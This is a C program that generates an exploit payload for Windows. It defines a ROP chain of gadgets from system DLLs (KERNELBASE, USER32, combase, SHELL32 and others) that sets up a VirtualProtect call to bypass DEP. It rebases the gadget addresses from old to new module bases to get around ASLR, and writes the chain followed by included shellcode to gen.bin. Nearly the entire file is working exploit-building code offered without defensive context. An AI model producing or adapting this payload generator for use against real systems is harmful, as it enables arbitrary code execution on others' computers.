#include <stdio.h>
#include <string.h>

typedef unsigned int u32;

u32 rop_chain[] = {
    // fill blank
    0x00000000, 0x01010101, 0x02020202, 0x03030303, 0x04040404, 
    0x05050505, 0x06060606, 0x07070707, 0x08080808, 0x09090909,
    0x0a0a0a0a, 0x0b0b0b0b, 0x0c0c0c0c, 0x0d0d0d0d, 0x0e0e0e0e,
    0x0f0f0f0f, 0x10101010, 0x11111111, 0x12121212, 0x13131313,
    0x14141414, 0x15151515, 0x16161616, 0x17171717, 0x18181818,
    0x19191919, 0x1a1a1a1a, 0x1b1b1b1b, 0x1c1c1c1c, 0x1d1d1d1d,
    0x1e1e1e1e, 0x1f1f1f1f, 0x20202020, 0x21212121, 0x22222222,
    0x23232323, 0x24242424, 0x25252525, 0x26262626, 0x27272727,
    0x28282828, 0x29292929, 0x2a2a2a2a, 0x2b2b2b2b, 0x2c2c2c2c,
    0x2d2d2d2d, 0x2e2e2e2e, 0x2f2f2f2f, 0x30303030, 0x31313131,
    //[---INFO:gadgets_to_set_ebp:---]
    0x7708c6f0,  // POP EBP // RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    0,
    0, // Unknown error: unexpected skip 8 bytes when ret
    0x7708c6f0,  // skip 4 bytes [KERNELBASE.dll] ** REBASED ** ASLR
    //[---INFO:gadgets_to_set_ebx:---]
    0x758a35c0,  // POP EAX // RETN [USER32.dll] ** REBASED ** ASLR 
    0xfffffdff,  // Value to negate, will become 0x00000201
    0x76d71d4c,  // NEG EAX // RETN [combase.dll] ** REBASED ** ASLR 
    0x6d184078,  // XCHG EAX,EBX // RETN [gdiplus.dll] ** REBASED ** ASLR 
    //[---INFO:gadgets_to_set_edx:---]
    0x7467fcd0,  // POP EAX // RETN [OLEACC.dll] ** REBASED ** ASLR 
    0xffffffc0,  // Value to negate, will become 0x00000040
    0x764addcd,  // NEG EAX // RETN [SHELL32.dll] ** REBASED ** ASLR 
    0x76de9450,  // XCHG EAX,EDX // RETN [combase.dll] ** REBASED ** ASLR 
    //[---INFO:gadgets_to_set_ecx:---]
    0x6e630b9f,  // POP ECX // RETN [COMCTL32.dll] ** REBASED ** ASLR 
    0x75c6b10c,  // &Writable location [IMM32.dll] ** REBASED ** ASLR
    //[---INFO:gadgets_to_set_edi:---]
    0x7666d77a,  // POP EDI // RETN [SHELL32.dll] ** REBASED ** ASLR 
    0x76d4200c,  // RETN (ROP NOP) [combase.dll] ** REBASED ** ASLR
    //[---INFO:gadgets_to_set_esi:---]
    0x76ea6522,  // POP ESI // RETN [combase.dll] ** REBASED ** ASLR 
    0x759ff4c7,  // JMP [EAX] [COMDLG32.dll]
    0x6f3bbae9,  // POP EAX // RETN [UxTheme.dll] ** REBASED ** ASLR 
    0x76C51368,  // ptr to &VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR
    //[---INFO:pushad:---]
    0x76ce1053,  // PUSHAD // RETN [combase.dll] ** REBASED ** ASLR 
    //[---INFO:extras:---]
    0x75a0d59c,  // ptr to 'push esp // ret ' [COMDLG32.dll] ** REBASED ** ASLR
    // following with shellcode
};

u32 old_base[] = {
    // fill blank
    0x00000000, 0x01010101, 0x02020202, 0x03030303, 0x04040404, 
    0x05050505, 0x06060606, 0x07070707, 0x08080808, 0x09090909,
    0x0a0a0a0a, 0x0b0b0b0b, 0x0c0c0c0c, 0x0d0d0d0d, 0x0e0e0e0e,
    0x0f0f0f0f, 0x10101010, 0x11111111, 0x12121212, 0x13131313,
    0x14141414, 0x15151515, 0x16161616, 0x17171717, 0x18181818,
    0x19191919, 0x1a1a1a1a, 0x1b1b1b1b, 0x1c1c1c1c, 0x1d1d1d1d,
    0x1e1e1e1e, 0x1f1f1f1f, 0x20202020, 0x21212121, 0x22222222,
    0x23232323, 0x24242424, 0x25252525, 0x26262626, 0x27272727,
    0x28282828, 0x29292929, 0x2a2a2a2a, 0x2b2b2b2b, 0x2c2c2c2c,
    0x2d2d2d2d, 0x2e2e2e2e, 0x2f2f2f2f, 0x30303030, 0x31313131,
    //[---INFO:gadgets_to_set_ebp:---]
    0x76f80000,  // POP EBP // RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    0,
    0,
    0x76f80000,  // skip 4 bytes [KERNELBASE.dll] ** REBASED ** ASLR
    //[---INFO:gadgets_to_set_ebx:---]
    0x75850000,  // POP EAX // RETN [USER32.dll] ** REBASED ** ASLR 
    0xfffffdff,  // Value to negate, will become 0x00000201
    0x76cc0000,  // NEG EAX // RETN [combase.dll] ** REBASED ** ASLR 
    0x6d0d0000,  // XCHG EAX,EBX // RETN [gdiplus.dll] ** REBASED ** ASLR 
    //[---INFO:gadgets_to_set_edx:---]
    0x74660000,  // POP EAX // RETN [OLEACC.dll] ** REBASED ** ASLR 
    0xffffffc0,  // Value to negate, will become 0x00000040
    0x76170000,  // NEG EAX // RETN [SHELL32.dll] ** REBASED ** ASLR 
    0x76cc0000,  // XCHG EAX,EDX // RETN [combase.dll] ** REBASED ** ASLR 
    //[---INFO:gadgets_to_set_ecx:---]
    0x6e5c0000,  // POP ECX // RETN [COMCTL32.dll] ** REBASED ** ASLR 
    0x75c50000,  // &Writable location [IMM32.dll] ** REBASED ** ASLR
    //[---INFO:gadgets_to_set_edi:---]
    0x76170000,  // POP EDI // RETN [SHELL32.dll] ** REBASED ** ASLR 
    0x76cc0000,  // RETN (ROP NOP) [combase.dll] ** REBASED ** ASLR
    //[---INFO:gadgets_to_set_esi:---]
    0x76cc0000,  // POP ESI // RETN [combase.dll] ** REBASED ** ASLR 
    0x759f0000,  // JMP [EAX] [COMDLG32.dll]
    0x6f360000,  // POP EAX // RETN [UxTheme.dll] ** REBASED ** ASLR 
    0x76bd0000,  // ptr to &VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR
    //[---INFO:pushad:---]
    0x76cc0000,  // PUSHAD // RETN [combase.dll] ** REBASED ** ASLR 
    //[---INFO:extras:---]
    0x759f0000,  // ptr to 'push esp // ret ' [COMDLG32.dll] ** REBASED ** ASLR
    // following with shellcode
};

u32 new_base[] = {
    // fill blank
    0x00000000, 0x01010101, 0x02020202, 0x03030303, 0x04040404, 
    0x05050505, 0x06060606, 0x07070707, 0x08080808, 0x09090909,
    0x0a0a0a0a, 0x0b0b0b0b, 0x0c0c0c0c, 0x0d0d0d0d, 0x0e0e0e0e,
    0x0f0f0f0f, 0x10101010, 0x11111111, 0x12121212, 0x13131313,
    0x14141414, 0x15151515, 0x16161616, 0x17171717, 0x18181818,
    0x19191919, 0x1a1a1a1a, 0x1b1b1b1b, 0x1c1c1c1c, 0x1d1d1d1d,
    0x1e1e1e1e, 0x1f1f1f1f, 0x20202020, 0x21212121, 0x22222222,
    0x23232323, 0x24242424, 0x25252525, 0x26262626, 0x27272727,
    0x28282828, 0x29292929, 0x2a2a2a2a, 0x2b2b2b2b, 0x2c2c2c2c,
    0x2d2d2d2d, 0x2e2e2e2e, 0x2f2f2f2f, 0x30303030, 0x31313131,
    //[---INFO:gadgets_to_set_ebp:---]
    0x76d60000,  // POP EBP // RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    0,
    0,
    0x76d60000,  // skip 4 bytes [KERNELBASE.dll] ** REBASED ** ASLR
    //[---INFO:gadgets_to_set_ebx:---]
    0x76bc0000,  // POP EAX // RETN [USER32.dll] ** REBASED ** ASLR 
    0xfffffdff,  // Value to negate, will become 0x00000201
    0x76260000,  // NEG EAX // RETN [combase.dll] ** REBASED ** ASLR 
    0x70030000,  // XCHG EAX,EBX // RETN [gdiplus.dll] ** REBASED ** ASLR 
    //[---INFO:gadgets_to_set_edx:---]
    0x688c0000,  // POP EAX // RETN [OLEACC.dll] ** REBASED ** ASLR 
    0xffffffc0,  // Value to negate, will become 0x00000040
    0x75ca0000,  // NEG EAX // RETN [SHELL32.dll] ** REBASED ** ASLR 
    0x76260000,  // XCHG EAX,EDX // RETN [combase.dll] ** REBASED ** ASLR 
    //[---INFO:gadgets_to_set_ecx:---]
    0x710b0000,  // POP ECX // RETN [COMCTL32.dll] ** REBASED ** ASLR 
    0x76b90000,  // &Writable location [IMM32.dll] ** REBASED ** ASLR
    //[---INFO:gadgets_to_set_edi:---]
    0x75ca0000,  // POP EDI // RETN [SHELL32.dll] ** REBASED ** ASLR 
    0x76260000,  // RETN (ROP NOP) [combase.dll] ** REBASED ** ASLR
    //[---INFO:gadgets_to_set_esi:---]
    0x76260000,  // POP ESI // RETN [combase.dll] ** REBASED ** ASLR 
    0x76f80000,  // JMP [EAX] [COMDLG32.dll]
    0x72970000,  // POP EAX // RETN [UxTheme.dll] ** REBASED ** ASLR 
    0x75b10000,  // ptr to &VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR
    //[---INFO:pushad:---]
    0x76260000,  // PUSHAD // RETN [combase.dll] ** REBASED ** ASLR 
    //[---INFO:extras:---]
    0x76f80000,  // ptr to 'push esp // ret ' [COMDLG32.dll] ** REBASED ** ASLR
    // following with shellcode
};

#define DEBUG

#include "shellcode.c"

int main() {
    // Open Files
    FILE *fp = fopen("gen.bin", "wb");
#ifdef DEBUG
    FILE *fd = fopen("gen.txt", "w");
#endif

    // Set Rop Chain
    int siz = sizeof(rop_chain) / sizeof(u32);
    for(int i = 0; i < siz; i++) {
        u32 x = rop_chain[i] - old_base[i] + new_base[i];
        fwrite(&x, 1, sizeof(x), fp);
#ifdef DEBUG
        fprintf(fd, "%#.8x\n", x);
#endif
    }

    // Set Shell Code
    fwrite(shellCode, 1, CODE_SIZE, fp);

#ifdef DEBUG
    fclose(fd);
#endif
    fclose(fp);
    return 0;
}